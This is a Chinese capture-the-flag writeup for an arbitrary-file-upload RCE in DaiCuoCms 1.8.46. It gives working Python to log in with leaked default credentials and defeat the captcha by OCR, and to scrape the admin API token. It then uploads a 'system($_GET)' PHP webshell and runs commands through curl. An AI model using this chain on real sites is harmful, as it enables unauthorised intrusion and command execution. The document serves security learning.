---
title: 'DaiCuoCms 文件上传 Writeup'
date: '2026-07-19T00:00:00Z'
modifiedTime: '2026-07-19T00:00:00Z'
intro: '访问目标，返回 DaiCuoCms（呆错文章管理系统）首页，页面版本标识 `?1.8.46`。'
tags: ['ctf', 'writeup', 'cve', 'sql注入', 'ssti', 'rce', '文件上传', 'php', 'java', 'python', '命令注入', 'http']
cover: ''
---
# DaiCuoCms 文件上传 Writeup

## 题目信息

| 项目 | 内容 |
|------|------|
| 题目 | DaiCuoCms RCE |
| 地址 | `ulr799b.haobachang2.loveli.com.cn:8888` |
| 漏洞 | DaiCuoCms 后台任意文件上传 → RCE |
| 分类 | Web — 远程代码执行 |
| 技术栈 | DaiCuoCms 1.8.46 / ThinkPHP / PHP / Apache 2.4.52 (Debian) |

## 解题流程

### 一、信息收集

访问目标，返回 DaiCuoCms（呆错文章管理系统）首页，页面版本标识 `?1.8.46`。

响应头确认技术栈：

```
Server: Apache/2.4.52 (Debian)
Content-Type: text/html; charset=utf-8
```

首页 JS 配置暴露上传接口路径：

```javascript
data-upload="/api/upload/save"
data-file="/admin.php"
```

`/README.md` 泄露关键信息：

> 后台入口（admin.php）、默认用户名（admin）、默认密码（admin888）

### 二、后台登录

后台登录地址为 `/admin.php/index/login`，有图形验证码保护。

#### 验证码 OCR 绕过

验证码图片地址 `/index.php?s=captcha`，使用 `ddddocr` 自动识别：

```python
import ddddocr, requests

s = requests.Session()
ocr = ddddocr.DdddOcr(show_ad=False)

for attempt in range(30):
    s.get(f"{target}/admin.php/index/login")
    r = s.get(f"{target}/index.php?s=captcha")
    captcha_text = ocr.classification(r.content)
    data = {"user_name": "admin", "user_pass": "admin888", "user_captcha": captcha_text}
    r2 = s.post(f"{target}/admin.php/index/login", data=data,
                headers={"X-Requested-With": "XMLHttpRequest"})
    resp = json.loads(r2.text)
    if resp.get("code") == 1:
        break  # 登录成功
```

### 三、获取 API TOKEN

`/api/upload/save` 接口要求 TOKEN 认证（`"请先申请TOKEN"`）。从后台系统配置页面获取：

```python
r = s.get(f"{target}/admin.php/config/index")
token = re.search(r'name="site_token"[^>]*value="([^"]*)"', r.text).group(1)
# token = "b2c7d3b63bb894aff6f7ec4372e8aa27"
```

### 四、任意文件上传 GetShell

上传接口 `/api/upload/save` 存在 **后缀校验缺陷**：仅拦截了 `.phtml`、`.php5`、`.htaccess`、`.user.ini` 等后缀，但**未拦截 `.php` 后缀**，导致可直接上传 PHP Webshell。

#### 上传 PHP 文件

```python
headers = {"X-Requested-With": "XMLHttpRequest", "token": token}
files = {"file": ("shell.php", b"<?php system($_GET['c']); ?>", "image/jpeg")}
r = s.post(f"{target}/api/upload/save", files=files, headers=headers)
# 返回：{"code":1, "data":{"url":"/datas/attachment/20260525/1d12bef...da2.php"}}
```

#### 触发执行

```bash
curl "http://TARGET:8888/datas/attachment/20260525/1d12bef306739c55889852f7be032da2.php?c=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

#### 上传后缀测试结果

| 文件名 | 结果 |
|--------|------|
| `shell.php` | ✅ 上传成功 |
| `shell.phtml` | ❌ 上传文件后缀不允许 |
| `shell.php5` | ❌ 上传文件后缀不允许 |
| `.htaccess` | ❌ 上传文件后缀不允许 |
| `user.ini` | ❌ 上传文件后缀不允许 |
| `shell.jpg.php` | ✅ 上传成功（重命名为 .php） |

黑名单漏掉了最基本的 `.php` 后缀，这是一个典型的安全配置失误。

### 五、查找 Flag

```bash
# 通过 webshell 执行
curl "http://TARGET:8888/datas/attachment/.../shell.php?c=cat /tmp/flag.txt"
# flag{ec40d2a90f7d4e069ae6df3773affbdb}
```

## Flag

```
flag{ec40d2a90f7d4e069ae6df3773affbdb}
```

## 漏洞总结

| 项目 | 详情 |
|------|------|
| CMS | DaiCuoCms 1.8.46 |
| 框架 | ThinkPHP |
| 漏洞类型 | 后台任意文件上传 → RCE |
| 根因 | 上传接口后缀黑名单遗漏 `.php`，仅拦截了 `.phtml`、`.php5` 等变体 |
| 利用条件 | 需要后台管理员权限（弱口令 admin/admin888）+ API TOKEN |
| 利用方式 | 登录后台 → 获取 TOKEN → 上传 .php 文件 → 直接访问执行 |

## 攻击链路

```
识别 DaiCuoCms → README.md 泄露默认凭据 → OCR 绕验证码登录后台 → 配置页获取 API TOKEN → /api/upload/save 上传 .php 文件 → 访问上传文件触发 RCE → 读取 /tmp/flag.txt
```

## 踩坑记录

1. **后台入口隐蔽**：`/admin.php/index/login` 是登录地址，而非常见的 `/admin/login`。`/admin.php` 直接访问会显示 ThinkPHP 的空操作提示。

2. **API TOKEN 认证**：上传接口 `/api/upload/save` 要求 TOKEN 认证，TOKEN 可从后台配置页面 `site_token` 字段获取，通过 HTTP 请求头 `token` 传递。

3. **黑名单遗漏 .php**：上传接口的黑名单拦截了 `.phtml`、`.php5` 等变体后缀，却遗漏了最基本的 `.php` 后缀，属于典型的安全配置失误。正确做法应使用白名单（仅允许图片后缀）。

## 相关笔记

- [[CLTPHP_模板注入_Writeup|CLTPHP 模板注入 — 另一个 CMS 后台利用]]
